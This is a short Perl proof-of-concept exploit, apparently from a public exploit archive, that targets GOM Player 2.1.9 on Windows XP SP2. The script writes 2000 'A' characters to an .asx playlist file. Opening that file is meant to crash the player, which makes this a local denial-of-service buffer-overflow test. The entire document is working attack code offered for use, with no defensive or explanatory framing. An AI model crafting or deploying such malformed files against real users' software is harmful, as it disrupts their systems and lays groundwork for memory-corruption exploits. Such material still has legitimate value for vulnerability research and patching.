#!usr/bin/perl
#Exploits title :[GOM player V 2.1.9 Local crash poc]
#Date : [2010/01/02]
#Aouther : [SarBoT511]
#downloads :[http://en.kioskea.net/telecharger/download-2141-gom-player]
#tested on :[win xp sp2]
#GOM player V 2.1.9
 
 
$file="SarBoT511.asx";
$boom="A" x 2000;
open(myfile,">>$file");
print myfile $boom;
close(myfile);
print "Done ..! ~#";